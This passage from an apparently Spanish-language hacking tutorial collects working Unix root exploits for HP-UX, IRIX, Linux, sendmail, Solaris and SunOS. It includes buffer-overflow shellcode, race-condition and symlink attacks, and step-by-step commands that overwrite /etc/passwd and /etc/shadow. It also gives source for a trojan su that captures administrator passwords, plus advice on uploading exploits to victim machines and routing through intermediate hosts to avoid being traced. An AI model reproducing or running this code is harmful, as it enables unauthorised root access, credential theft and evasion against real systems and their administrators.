 * /usr/etc/vhe/vhe_u_mnt setuid to root.
 *
 * This program written by pluvius@io.org
 * The exploit code itself written by misar@rbg.informatik.th-darmstadt.de
 *
 * I found that the exploit code didn't always work due to a race between
 * the child and the parent, and that a link() called failed due to
 * the fact that user directories and the /tmp are in different file systems
 * so you must create a symlink.
 * I added in a call to alarm() so that the timing between the two processes
 * is ok..
 *
 ***/
#include <stdio.h>
#include <stdlib.h>
#include <pwd.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <netdb.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/utsname.h>

#define BUGGY_PROG "/usr/etc/vhe/vhe_u_mnt"
#define NAME "<defunct>"

int test_host()
{ struct utsname name;
   uname(&name);
   return !strcmp(name.sysname,"HP-UX");
}
int check_mount()
{ struct stat my_buf;
   if (stat(BUGGY_PROG, &my_buf))
      return 0;
   return !((my_buf.st_mode & S_ISUID) != S_ISUID);
}
void pause_handler()
{
   signal(SIGALRM,pause_handler);
}
int rhost_user(user)
char *user;
{
  struct passwd *info;
  char   homedir[80];
  int fd[2];
  int procno;
  struct stat my_buf;
  int fsize;

   info = getpwnam(user);
   if (info==NULL) {
      fprintf(stderr,"ERROR: Unknown user %s\n",user);
      exit(-3);
   }
   strcpy(homedir,info->pw_dir);
   if (homedir[strlen(homedir)-1] != '/')
      strcat(homedir,"/");
   strcat(homedir,".rhosts");

   signal(SIGALRM,pause_handler);
   memset(my_buf,0,sizeof(my_buf));
   stat(homedir,&my_buf);
   fsize = my_buf.st_size;

  /* now the exploit code... slightly modified.. but mostly from the source */
  /* by misar@rbg.informatik.th-darmstadt.de                                */
   pipe(fd);
   if (!(procno=fork())) {
      close(0);
      dup(fd[0]);
      close(fd[1]);
      close(1);
      close(2);
      alarm(2); /* wait for other process */
      nice(5);
      execl(BUGGY_PROG,NAME,NULL);
   } else {
    FILE *out;
    char listfile[25];
    char mntfile[25];
    struct stat dummy;

      close(1);
      dup(fd[1]);
      close(fd[0]);
      write(1,"+\n",2);
      sprintf(listfile,"/tmp/vhe_%d",procno+2);
      sprintf(mntfile,"/tmp/newmnt%d",procno+2);
      while (stat(listfile,&dummy));
      unlink(listfile);
      out=fopen(listfile,"w");
      fputs("+ +\n",out);
      fclose(out);
      unlink(mntfile);
      symlink(homedir,mntfile);
      waitpid(procno,NULL,0);
   }
   stat(homedir,&my_buf);
   return (fsize != my_buf.st_size);
}

void main(argc,argv)
int   argc;
char *argv[];
{
  int i;
  int rhost_root = 0;
  char userid[10];

   if (!test_host()) {
      fprintf(stderr,"ERROR: This bug is only exhibited by HP-UX\n");
      exit(-1);
   }

   if (!check_mount()) {
      fprintf(stderr,
              "ERROR: %s must exist and be setuid root to exploit this bug\n",
              BUGGY_PROG);
      exit(-2);
   }

   for (i=0;(i<5)&&(!rhost_root);i++) {
      fprintf(stderr,"Attempting to .rhosts user root..");
      if (!rhost_user("root")) {
         fprintf(stderr,"failed.\n");
      } else {
         fprintf(stderr,"succeeded\n");
         rhost_root = 1;
      }
   }

   if (!rhost_root) {
      /* failed to rhost root, try user 'bin' */
      fprintf(stderr,"Too many failures.. trying user bin...");
      if (!rhost_user("bin")) {
         fprintf(stderr,"failed.\n");
         exit(-4);
      }
      fprintf(stderr,"succeeded.\n");
      strcpy(userid,"bin");
   } {
      strcpy(userid,"root");
   }
   fprintf(stderr,"now type: \"remsh localhost -l %s csh -i\" to login\n",
           userid);
}

------------ FIN -------------------------------------------------------------

  OTRO PARA HP

------------ Codigo Fuente ---------------------------------------------------

/* SOD /usr/diag/bin/[cm]stm buffer overflow */

main()
{
char buf[500];

strcpy(buf,"\x41\x41\x34\x01\x01\x02\x08\x22\x04\x01\x60\x20\x02\xa6\x60\x20
\x02\xac\xb4\x3a\x02\x98\x34\x16\x01\x76\x34\x01\x02\x76\x08\x36\x02\x16\x0
8\x21\x02\x80\x20\x20\x08\x01\xe4\x20\xe0\x08\x08\x21\x02\x80\x43\x43\x43\x
43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\
x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x4
3\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x
43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\
x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x4
3\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x
43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\
x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x4
3\x43\x43\x43\x43\x43\x2f\x62\x69\x6e\x2f\x73\x68\x2e\x2d\x69\x2e\x44\x44\x4
4\x44\x44\x7b\x03\x30\x1b");

execl("/usr/diag/bin/mstm","/usr/diag/bin/mstm","-l",buf,(char *)0);
/* Either-or, same overflow */
execl("/usr/diag/bin/cstm","/usr/diag/bin/cstm","-l",buf,(char *)0);
}

------------ FIN -------------------------------------------------------------

  IRIX 6.2-6.3

------------ Codigo Fuente ---------------------------------------------------

Irix buffer overflow in /usr/bin/X11/xlock
The exploit as posted works on Irix 6.3. To get it to work on 6.2,
either change OFFSET from 0x118 to 0x160, or pass the program '20' as a
parameter.

Note that the shell spawned as a result of this exploit has uid=0,
euid=youruserid. To make your euid=0 you'll need a program like the
following:

void main(void)
{
    setuid(0,0);
    execl("/bin/sh", "sh", 0);
}

Regards,

 David Hedley (hedley@cs.bris.ac.uk)

------------------- cut here -------------------------

/* /usr/bin/X11/xlock exploit by DCRH 25/5/97
 *
 * Tested on: R5000 O2 (Irix 6.3)
 *            R8000 Power Challenge (Irix64 6.2)
 *
 * For Irix 6.2, change OFFSET to 0x160, or pass '20' as a parameter
 *
 * Exploit doesn't work on Irix 5.x due to stack position
 *
 * compile as: cc -n32 xlock.c
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>

#define NUM_ADDRESSES   800
#define BUF_LENGTH      80
#define EXTRA           190
#define OFFSET          0x118    /* 0x160 for Irix 6.2 */
#define GP_OFFSET       32472
#define IRIX_NOP        0x03e0f825    /* move $ra,$ra */

#define u_long unsigned

u_long get_sp_code[] = {
    0x03a01025,         /* move $v0,$sp         */
    0x03e00008,         /* jr $ra               */
    0x00000000,         /* nop                  */
};

u_long irix_shellcode[] = {
    0x24041234,         /* li $4,0x1234         */
    0x2084edcc,         /* sub $4,0x1234        */
    0x0491fffe,         /* bgezal $4,pc-4       */
    0x03bd302a,         /* sgt $6,$sp,$sp       */
    0x23e4012c,         /* addi $4,$31,264+36   */
    0xa086feff,         /* sb $6,-264+7($4)     */
    0x2084fef8,         /* sub $4,264           */
    0x20850110,         /* addi $5,$4,264+8     */
    0xaca4fef8,         /* sw $4,-264($5)       */
    0xaca6fefc,         /* sw $4,-260($5)       */
    0x20a5fef8,         /* sub $5, 264          */
    0x240203f3,         /* li $v0,1011          */
    0x03ffffcc,         /* syscall 0xfffff      */
    0x2f62696e,         /* "/bin"               */
    0x2f7368ff,         /* "/sh"                */
};

char buf[NUM_ADDRESSES+BUF_LENGTH + EXTRA + 8];

void main(int argc, char **argv)
{
    char *env[] = {NULL};
    u_long targ_addr, stack, tmp;
    u_long *long_p;
    int i, code_length = strlen((char *)irix_shellcode)+1;
    u_long (*get_sp)(void) = (u_long (*)(void))get_sp_code;

    stack = get_sp();

    if (stack & 0x80000000) {
        printf("Recompile with the '-32' option\n");
        exit(1);
    }

    long_p =(u_long *)  buf;
    targ_addr = stack + OFFSET;

    if (argc > 1)
        targ_addr += atoi(argv[1]) * 4;

    if (targ_addr + GP_OFFSET > 0x80000000) {
        printf("Sorry - this exploit for Irix 6.x only\n");
        exit(1);
    }

    tmp = (targ_addr + NUM_ADDRESSES + (BUF_LENGTH-code_length)/2) & 
~3;

    while ((tmp & 0xff000000) == 0 ||
           (tmp & 0x00ff0000) == 0 ||
           (tmp & 0x0000ff00) == 0 ||
           (tmp & 0x000000ff) == 0)
        tmp += 4;

    for (i = 0; i < NUM_ADDRESSES/sizeof(u_long); i++)
        *long_p++ = tmp;

    for (i = 0; i < (BUF_LENGTH - code_length) / sizeof(u_long); i++)
        *long_p++ = IRIX_NOP;

    for (i = 0; i < code_length/sizeof(u_long); i++)
        *long_p++ = irix_shellcode[i];

    tmp = (targ_addr + GP_OFFSET + 32/* + NUM_ADDRESSES/2 */) & ~3;

    for (i = 0; i < EXTRA / sizeof(u_long); i++)
        *long_p++ = (tmp << 16) | (tmp >> 16);

    *long_p = 0;

    printf("stack = 0x%x, targ_addr = 0x%x\n", stack, targ_addr);

    execle("/usr/bin/X11/xlock", "xlock", "-name", buf, 0, env);
    perror("execl failed");
}

------------ FIN -------------------------------------------------------------

  IRIX 5.3-6.2

------------ Codigo Fuente ---------------------------------------------------

PROBLEM. systour
AFFECTS. SGI IRIX 5.3 and 6.2 with the systour package available.
REQUIRED. account on server
RISK. root compromise, denial of service, etc.

---

Exploit:

irst, we set up an environment for running inst. dryrun is set to true
because we are considerate environmentalists.

$ rbase=$HOME; export rbase
$ mkdir -p $HOME/var/inst
$ echo "dryrun: true" > $HOME/.swmgrrc

These three lines should be very familiar to all exploitors.

$ cp -p /bin/sh /tmp/foobar
$ printf '#\!/bin/sh\nchmod 4777 /tmp/foobar\n' > $HOME/var/inst/.exitops
$ chmod a+x $HOME/var/inst/.exitops

Now run it.

$ /usr/lib/tour/bin/RemoveSystemTour
Executing outstanding exit-commands from previous session ..
Successfully completed exit-commands from previous session.
Reading installation history
Checking dependencies
ERROR : Software Manager: automatic installation failed: New target
(nothing installed) and no distribution.

---

DISCUSSION. The easiest solution is to replace RemoveSystemTour with
a binary that checks the password. However, RemoveSystemTour may not be
the only way to access inst, and so these general recommendations apply:

inst should check UID and lock configuration options when called non-
interactively from versions and with euid 0. inst also has a race
condition on the file /tmp/shPID0, the shell script it creates to make the
appropriate directory (rbase). inst should verify the variables it
uses--by relying on an external shell script, environment variables, IFS,
etc. can be tampered with. Finally, inst will happily overwrite logfiles
specified in the .swmgrrc file and creat() the shell script over anything.

------------ FIN -------------------------------------------------------------

  LINUX (pongo varios ya que hay muchos ...)

------------ Codigo Fuente ---------------------------------------------------

/*

   Just Your Standard EGGSHELL Proggie:
   traceroute buffer overflow exploit for RedHat Linux 5.0
   mostly ripped from Aleph One <aleph1@underground.org>
   Wilton Wong

   wwong@blackstar.net

   gcc -o trace_shell trace_shell.c

*/

#include <stdlib.h>

#define DEFAULT_OFFSET                 0
#define DEFAULT_BUFFER_SIZE            1019
#define DEFAULT_EGG_SIZE               2048
#define NOP                            0x90

char shellcode[] =
        "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
        "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
        "\x80\xe8\xdc\xff\xff\xff/bin/sh";

unsigned long get_sp(void) {

   __asm__("movl %esp,%eax");
}

void main(int argc, char *argv[]) {
  char *buff, *ptr, *egg;
  long *addr_ptr, addr;
  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
  int i, eggsize=DEFAULT_EGG_SIZE;
  if (argc > 1) bsize  = atoi(argv[1]);
  if (argc > 2) offset = atoi(argv[2]);
  if (argc > 3) eggsize = atoi(argv[3]);
  if (!(buff = malloc(bsize))) {
    printf("Can't allocate memory.\n");
    exit(0);
  }
  if (!(egg = malloc(eggsize))) {
    printf("Can't allocate memory.\n");
    exit(0);
  }
  addr = get_sp() - offset;
  printf("Using address: 0x%x\n", addr);
  ptr = buff;
  addr_ptr = (long *) ptr;
  for (i = 0; i < bsize; i+=4)
    *(addr_ptr++) = addr;
  ptr = egg;
  for (i = 0; i < eggsize - strlen(shellcode) - 1; i++)
    *(ptr++) = NOP;
  for (i = 0; i < strlen(shellcode); i++)
    *(ptr++) = shellcode[i];
  buff[bsize - 1] = '\0';
  egg[eggsize - 1] = '\0';
  memcpy(egg,"EGG=",4);
  putenv(egg);
  memcpy(buff,"RET=",4);
  putenv(buff);
  printf("Now run: /usr/sbin/traceroute $RET\n");
  system("/bin/bash");
}

------------ FIN -------------------------------------------------------------

  Ahora uno para SLACKWARE:

------------ Codigo Fuente ---------------------------------------------------

/*
  SLACKWARE Traceroute Buffer OverFlow -- (c) shit-head (w0nky@usa.net) 
1997
  Created: 8/15/97

  Give thanks to Solar Designer for his su overflow, this is based
  on that peice of work.

  This is for educational purposes only, in no way am I responsible 
  for what you do with this.  This should be used by sys admins, or
  people who have permission of the admin to run it to see if this
  hole can exist on their system.  If you use it for the wrong reasons
  then I say *tisk* on you.  I will not be held responsible for your 
  actions.
  
  This could be done with a generic overflow program, but just
  running this is easier.
 
  USAGE OF THIS DOES NOT GIVE YOU TECH SUPPORT SO DON'T
  MESSAGE ANYBODY ON IRC ABOUT THIS.

*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
char *shellcode =
  "\x31\xc0\xb0\x31\xcd\x80\x93\x31\xc0\xb0\x17\xcd\x80\x68\x59\x58\xff\xe1"
  "\xff\xd4\x31\xc0\x99\x89\xcf\xb0\x2e\x40\xae\x75\xfd\x89\x39\x89\x51\x04"
  "\x89\xfb\x40\xae\x75\xfd\x88\x57\xff\xb0\x0b\xcd\x80\x31\xc0\x40\x31\xdb"
  "\xcd\x80/"
  "/bin/sh"
  "0";
char *get_sp() {
   asm("movl %esp,%eax");
}
#define bufsize 2048
char buffer[bufsize];
main() {
  int i;
  for (i = 0; i < bufsize - 4; i += 4)
    *(char **)&buffer[i] = get_sp() - 3072;
  memset(buffer, 0x90, 512);
  memcpy(&buffer[512], shellcode, strlen(shellcode));
  buffer[bufsize - 1] = 0;
  system("clear");
  
printf("__________________________________________________________
____________________\n");
  printf("| Traceroute Overflow -- (c) shit-head 1997\n");
  printf("| Give props to Solar Designer for his su overflow, this is based on 
that.\n");
  printf("|\n");
  printf("| Peep's to: suid, knowy, thugzsta, you all be 2 cool.\n");
  printf("|\n");
  printf("| *NOTE* I'm not responsible if you abuse this. Run only w/ 
premission\n");
  printf("| Sending Overflow.... Done.\n");
  printf("------------------------------------------------------------------------------\n");
  setenv("NLSPATH", buffer, 1);
  execl("/usr/bin/traceroute", "/usr/bin/traceroute", NULL);
}

------------ FIN -------------------------------------------------------------

  SENDMAIL

------------ Codigo Fuente ---------------------------------------------------

        Aunque obviamente el sendmail no es un sistema operativo pongo
  algunos xploits para el, ya que es el clasico de los holes en maquinas unix.


  Sendmail 8.7-8.8.2


#/bin/sh 
# 
# 
#                                   Hi ! 
#                This is exploit for sendmail smtpd bug 
#    (ver. 8.7-8.8.2 for FreeBSD, Linux and may be other platforms). 
#         This shell script does a root shell in /tmp directory. 
#          If you have any problems with it, drop me a letter. 
#                                Have fun ! 
# 
# 
#                           ---------------------- 
#               --------------------------------------------- 
#    -----------------   Dedicated to my beautiful lady   ------------------ 
#               --------------------------------------------- 
#                           ---------------------- 
# 
#          Leshka Zakharoff, 1996. E-mail: leshka@leshka.chuvashia.su 
# 
# 
# 
echo   'main()                                                '>>leshka.c 
echo   '{                                                     '>>leshka.c 
echo   '  execl("/usr/sbin/sendmail","/tmp/smtpd",0);         '>>leshka.c 
echo   '}                                                     '>>leshka.c 
# 
# 
echo   'main()                                                '>>smtpd.c 
echo   '{                                                     '>>smtpd.c 
echo   '  setuid(0); setgid(0);                               '>>smtpd.c 
echo   '  system("cp /bin/sh /tmp;chmod a=rsx /tmp/sh");      '>>smtpd.c 
echo   '}                                                     '>>smtpd.c 
# 
# 
cc -o leshka leshka.c;cc -o /tmp/smtpd smtpd.c 
./leshka 
kill -HUP `ps -ax|grep /tmp/smtpd|grep -v grep|tr -d ' '|tr -cs "[:digit:]"
"\n"|head -n 1`
rm leshka.c leshka smtpd.c /tmp/smtpd 
/tmp/sh 

  Descripcion y Notas:

        Este bug se basa en el hecho de que sendmail es un programa suid root
  y como tal puede ser invocado como demonio por cualquier usuario y tras
  ello cargar una pieza de codigo de cualquier parte por lo tanto el usuario
  puede mandar "se§ales" a sendmail y controlarlo con los beneficios que ello
  conlleva, basicamente el bug trastoca el HUP handler para permitir esto.

------------ FIN -------------------------------------------------------------

  Otro para el sendmail 8.8.4:

------------ Codigo Fuente ---------------------------------------------------

Try this:
Make hard link of /etc/passwd to /var/tmp/dead.letter
Telnet to port 25, send mail from some bad email address to some 
unreacheable hoost.
Watch your message get appended to passwd.
ie:
cowzilla::0:0:c0wz1ll4 0wns u:/:/bin/sh

This is not good.  Worked with my 8.8.4, will probably also work with 8.8.5

Root for the whole family

============================================================
======

okay, just want to point out some things about this exploit...
this won't work on big boxes that are partitioned cause you can only do a
hard link on the same file system.  another point is that any box that has
a 'MAILER-DAEMON' defined will get any mail that gets sent there instead of it
saving it to /var/tmp/dead.letter, ie, make an /etc/aliases file that defines
a MAILER-DAEMON. for instance, i add these two to my /etc/aliases:

MAILER-DAEMON:gonzo
postmaster:gonzo

then you just type 'newaliases' and you're good to go. (postmaster is a
general good idea) course then you have to deal with ppl's messed up mail...


============================================================
=======

Here's a nice little sendmail exploit that works with 8.8.4 and maybe with
8.8.5.
You need to have an account on the system you're exploiting.
telnet to your shell and issue following commands:

ln /etc/passwd /var/tmp/dead.letter
telnet target.host 25
mail from: non@existent.host
rcpt to: non@existent.host
data
kRad::0:0:J0oR dEaD:/root:/bin/bash
.
quit

The body of the message will be written into /etc/passwd and you've got a 
password-free root account.

Note that this will NOT work under any of the following circumstances:

1. /var and / are different partitions.
	You can't make a hardlink between different partitions.
2. There is a postmaster account or mail alias.
	Mail problems are sent to postmaster before they go to
	/var/tmp/dead.letter.	
3. /var/tmp doesn't exist or isn't publicly writable.
	Duh.
4. Other situations?

------------ FIN -------------------------------------------------------------

  SOLARIS

------------ Codigo Fuente ---------------------------------------------------

I have found a security hole in sdtcm_convert on Solaris 2.5.1. sdtcm_convert
- calendar data conversion utility - allows any user to change the owner for
any file (or directory) from the system or gain root access. The exploit is
very simple. Change the permision mode of your calendar file (callog.YOU)
from /var/spool/calendar directory (usual r--rw----) and run sdtcm_convert. 
sdtcm_convert 'll observe the change and 'll want  to correct it (it 'll ask
you first). You have only to delete the callog file and make a symbolic link
to a target file and your calendar file and said to sdtcm_convert 'y' (yes).
sdtcm_convert 'll make you the owner of target file ...
A simple way to correct this is to get out suid_exec bit from sdtcm_convert.

-----------------------------------------------------------------------------

 CDE is generally a can of worms.

 22:15  [wumpus:~] % whoami
 adam
 22:15  [wumpus:~] % ls -l /etc/shadow
 -r--------   1 root     sys          291 Jul 11 22:14 /etc/shadow
 22:15  [wumpus:~] % ln -s /etc/shadow /tmp/calorig.adam
 22:15  [wumpus:~] % /usr/dt/bin/sdtcm_convert -d /tmp -v 3 adam
 Loading the calendar ...

 WARNING!! Data will be lost when converting version 4 data format
 back to version 3 data format.

 Do you want to continue? (Y/N) [Y] y

 Doing conversion ...
 Writing out new file ...
 Conversion done successfully.
 Total number of appointments                    = 0
 Number of one-time appointments converted       = 0
 Number of repeating appointments converted      = 0
 Number of one-time appointments pruned          = 0
 Number of repeating appointments pruned         = 0
 The original file is saved in /tmp/calorig.adam
 22:15  [wumpus:~] % ls -l /etc/shadow
 -r--rw----   1 adam     daemon      3114 Jul 11 22:15 /etc/shadow
 22:15  [wumpus:~] % chmod 644 /etc/shadow
 22:15  [wumpus:~] % cp /dev/null /etc/shadow
 cp: overwrite /etc/shadow (y/n)? y
 22:15  [wumpus:~] % ls -l /etc/shadow
 -rw-r--r--   1 adam     daemon         0 Jul 11 22:15 /etc/shadow
 22:15  [wumpus:~] % echo "root::6445::::::" >> /etc/shadow
 22:16  [wumpus:~] % su
 # id
 uid=0(root) gid=1(other)
 # exit

------------ FIN -------------------------------------------------------------

  OTRO PARA SOLARIS

------------ Codigo Fuente ---------------------------------------------------

Author: mudge@l0pht.com

Overview:

A buffer overflow condition exists in the getopt(3) routine. By supplying
an invalid option and replacing argv[0] of a SUID program that uses the
getopt(3) function with the appropriate address and machine code instructions,
it is possible to overwrite the saved stack frame and upon return(s) force
the processor to execute user supplied instructions with elevated permissions.

Description:

While evaluating programs in the Solaris Operating System environment 
it became apparent that changing many programs trust argv[0] to never
exceed a certain length. In addition it seemed as though getopt was
simply copying argv[0] into a fixed size character array.

  ./test >>& ccc
  Illegal instruction (core dumped)

Knowing that the code in ./test was overflow free it seemed that the problem
must exist in one of the functions dynamically linked in at runtime through
ld.so. A quick gander through the namelist showed a very limited range of
choices for the problem to exist in.
 
  00020890 B _end
  0002088c B _environ
  00010782 R _etext
           U _exit
  00010760 ? _fini
  0001074c ? _init
  00010778 R _lib_version
  000105ac T _start
           U atexit
  0002088c W environ
           U exit
  0001067c t fini_dummy
  0002087c d force_to_data
  0002087c d force_to_data
  000106e4 t gcc2_compiled.
  00010620 t gcc2_compiled.
           U getopt
  00010740 t init_dummy
  00010688 T main

Next we checked out getopt() - as it looked like the most likely
suspect.

  #include <stdio.h>
 
  main(int argc, char **argv)
  {
    int opt;
 
    while ((opt = getopt(argc, argv, "a")) != EOF) {
      switch (opt) {
      }
    }
  }

  >gcc -o test test.c
  >./test -z
  ./test: illegal option -- z

Note the name it threw back at the beggining of the error message. It was
quite obvious that they are just yanking argv[0]. Changing argv[0] in 
the test program confirms this.

  for (i=0; i< 4096; i++)
    buffer[i] = 0x41;
 
   argv[0] = buffer;
 
With the above in place we see the following result:
  >./test -z
  [lot's of A's removed]AAAAAAAAA: illegal option -- z
  Bus error (core dumped)

By yanking out the object file from the static archive libc that is supplied
with Solaris our culprit was spotted [note - we assumed that libc.a was
built from the same code base that libc.so was].

  > nm getopt.o
           U _dgettext
  00000000 T _getopt
  00000000 D _sp
           U _write
  00000000 W getopt
           U optarg
           U opterr
           U optind
           U optopt
           U sprintf
           U strchr
           U strcmp
           U strlen

Here we see one of the infamous non-bounds-checking routines: sprintf();
More than likely the code inside getopt.c looks something like the following:

  getopt.c:
    char opterr[SOMESIZE];
    ...
    sprintf(opterr, argv[0]...);

Thus, whenever you pass in a non-existant option to a program that uses getopt
you run into the potential problem with trusting that argv[0] is smaller
than the space that has been allocated for opterr[]. 

This is interesting on the Sparc architecture as getopt() is usually called
out of main() and you need two returns [note - there are certain situations
in code on Sparc architectures that allow you to switch execution to your 
own code without needing two returns. Take a look at the TBR for some
enjoyable hacking] due to the sliding register windows. Some quick analysis
of SUID programs on a standard Solaris 2.5 box show that most of these
programs exit() or more likely call some form of usage()-exit() in the
default case for getopt and thus are not exploitable. However, at least
two of these programs provide the necessary returns to throw your
address into the PC :
     passwd(1)
     login(1)

On Solaris X86 you do not need these double returns and thus a whole world of
SUID programs allow unpriveledged users to gain root access: 
    (list of programs vulnerable too big to put here. sigh.)

Exploit:


  $./exploit "/bin/passwd" 4375 2> foo
  # id
  uid=0(root) gid=1(other)

------------ FIN -------------------------------------------------------------

  SUNOS

------------ Codigo Fuente ---------------------------------------------------

**************************************************************************
   HACK: Exploit the patched "loadmodule" with a path attack [8lgm]
 System: Sun OS 4.1.x (?others)
 Source: 8lgm
   Date: Jan 2, 1995
**************************************************************************
 
 
VERSIONES VULNERABLES:
 
        SunOS 4.1.* & Openwindows 3 con el ultimo parche para loadmodule.
 
DESCRIPCION:
 
        loadmodule usa system(3) para encontrar la arquitectura de la maquina.
 
IMPACTO:
 
        Usuarios locales pueden obtener acceso como r00t.
 
REPETIDO POR:
        
        Insertar el directorio local al comienzo de tu path
                $ set path=(. $path)

        Copiar un shell y darle los atributos 711
                $ echo "/bin/sh" > ld
                $ chmod 711 ld

        Ejecutar loadmodule con una llamada limpia y obtener un shell
        de r00t
                $ /usr/openwin/loadmodule sd.o evqload
                # whoami
                root

------------ FIN -------------------------------------------------------------

        Bueno, creo que ya han sido suficientes, a ver si para proximas
  ediciones del texto me lo curro un poco mas y los busco mas elegidos pero
  ahora viene el follon de examenes :o(   y los he pillado un poco al azar. A
  ver si tengo tiempo y en la proxima edicion pongo los que dan mas resultado
  e intento explicar un poco las pegas que tienen.. perdon por mi
  incompetencia jeje

        En realidad, por lo menos lo que hago yo en empaquetarlos en un tgz ya
  que los tengo ordenados por sistemas operativos y por versiones, subirlos a
  la maquina victima con ftp y rular los ke puedan servir para esa makina en 
  concreto. Para algunos sistemas operativos, tengo hechos scripts en shell
  que te los rulan automaticamente.. akonsejo ke lo hagais, no es dificil y
  te evitas tiempo :)

  7.3.- TROYANOS

        Bueno, un troyano es un programa que modifica su funcion habitual para
  conseguir algun objetivo que nos interese. En principio, una de las
  utilidades mas importantes de los troyanos es dejar backdoors con los
  tipicos troyanos del login, telnetd, fingerd y demas... espero que en
  posteriores ediciones del texto tenga tiempo para explicarlos estos un poco.
  Pero como en esta seccion lo que nos interesan son modos de pillar root, voy
  a contar un poco como usar el troyano de su para conseguir ese objetivo.

        Para aquellos que vais un poco verdes en unix, explico lo que es el
  su. En principio hay muchos administradores que entran con una cuenta de
  usuario normal y cuando necesitan hacer algo que requiere que sean root,
  ejecutan el comando su que permite cambiar el usuario a root. Esto se hace
  ya que no es conveniente ser root en la maquina por posibles metidas de
  pata (sobretodo a altas horas de la ma§ana jeje) y si por ejemplo haces un
  rm sobre un fichero importante y no eres root, no pasa nada en general ya
  que no tendras permisos para hacerlo.

        Para usar este sistema, hay que buscar quien usa su. Esto se puede
  hacer viendo en el /var/adm/messages (si tienes permisos para leerlo), el
  sulog u otros archivos de log dependiendo del sistema en el que estes, o
  bien entrar en los directorios HOME (si tienes permisos) y ver los history
  (que son distintos dependiendo del shell que se usa.. estan explicados en
  el apartado de borrar huellas) ya que en esos archivos se ven todos los
  comandos ejecutados por el usuario.

        Es decir, con esta tecnica tambien tenemos que sacar un passwd de 
  administrador, pero hay que tener en cuenta que si por ejemplo es una 
  maquina con dos users con id=0 y que ademas cada uno de ellos entra con 
  una cuenta normal para hacer luego su, hay 4 cuentas de "root" por lo que 
  pasando unos cuantos diccionarios es facil que caiga alguna de las cuatro.

        En fin, siguiendo con el rollo y suponiendo que tenemos la cuenta de
  ese user que luego hace su root, se ha de cambiar la variable path a un
  directorio donde pongamos el su troyano, es decir, pillamos el codigo del
  su, lo compilamos y lo metemos en un directorio cualquiera buscando que no
  cante mucho. Ese directorio lo ponemos en el path de manera que este antes
  que el directorio por defecto donde esta el su verdadero. Por ejemplo, si
  el path es:

  PATH=/bin/:/sbin/.........

        Tendria que ponerse si el directorio donde esta el troyano de su, se
        llama /.troyano:

  PATH=/.troyano:/bin:/sbin......

        Asi, si el administrador que no ha entrado con la cuenta de root hace
  su, entrara el troyano que lo que hace pedirle el passwd y le dice que es
  un passwd incorrecto con lo que el pensara que se ha equivocado
  introduciendo el dato y te guarda el passwd en un fichero determinado. Tras
  esto, el su troyano se borra automaticamente por lo que pierde el rastro.

        Esto puede tener algunas pegas como son que esa variable nueva
  a§adida al path canta un poco, que el tio se mosquee cuando el su le de
  error, y alguno mas que pueden ir surgiendo sobre la marcha, o sea, que
  probadlo que da buenos resultados aunque teneis que tener cuidado con estas
  pegas.

  Bueno, ahi va el codigo:

------------ Codigo Fuente ---------------------------------------------------

/* su trojan ribbed - by FA-Q
 * werd to lwn for his help.
 * mkdir .elm
 * cc -o ~/.elm/su su.c
 * edit .bash_profile or .bashrc
 * add PATH=$HOME/.elm:$PATH
 */

#include <stdio.h>
#include <stdlib.h>

#define SU_PASS "/tmp/.rewt"

main (int argc, char *argv[])
{
   char *key;
   char buf[24];
   FILE *fd;

   key = (char *)getpass ("Password:");
   fd = fopen(SU_PASS,"w");
   fprintf(fd, "pass: %s\n", key);
   fclose(fd);
   printf ("su: incorrect password\n");
   sprintf(buf, "rm %s", argv[0]);
   system(buf);
   exit (1);
}

------------ FIN -------------------------------------------------------------

        Bueno, creo que con estos tres metodos sera suficiente para pillar
  root en muchas makinas... una de las cosas mas importantes es buscar
  exploits, asi ke buscando un poko en la red, tendreis muchiiiisimos :)

  8- HACKEAR CON CONDON ( o gateway)

        Tras explicar los metodos para entrar en maquinas y pillar root, en
  este y el proximo apartado se va a explicar un poco que hacer para ke no te
  pillen.

        En general, cuando tu hackeas una maquina sin ningun tipo de
  proteccion, simplemente haces telnet victima.com o ftp o el servicio que
  quieras. Esto esta muy bien porque claramente la distancia mas corta entre
  dos puntos es la linea recta, pero el problema es que en algunos logs de la
  maquina victima aparece nuestro ip y por tanto nos tienen perfectamente
  identificados con solo hacer un last.

        Hay que puntualizar que otra manera de hacer las cosas es no usar
  condon pero tener mucha experiencia en el borrado de huellas pero eso no es 
  aconsejable si no estas muy seguro de tus habilidades.

        Un tema a discutir, seria cuando hay que usar protecciones o no. Un
  consejo personal es hacerlo dependiendo del tipo de maquina y del tipo de
  cosas que se van a hacer en ella. No es lo mismo entrar en una maquina de
  una universidad que sabemos que el root no esta muy experimentado que
  entrar en una maquina con medidas serias de seguridad. Tampoco es lo mismo
  entrar para ver que la cuenta que has pillado funciona, hacer un ls y poco
  mas, que entrar, ejecutar xploits, poner un sniffer, etc. Obviamente, en el
  segundo caso hay que tomar algun tipo de proteccion si no quieres acabar en
  la carcel. Ademas, mi opinion es que este sistema es un metodo de seguridad
  adicional ademas obviamente de borrar huellas y usar este sistema
  simplemente por si has fallado en algo pero no solo usar esto. Ademas, si
  tienes una cuenta y la usas con condon y no borras huellas, no te pillaran,
  pero seguramente veran los logs y te cancelaran la cuenta o cambiaran cosas
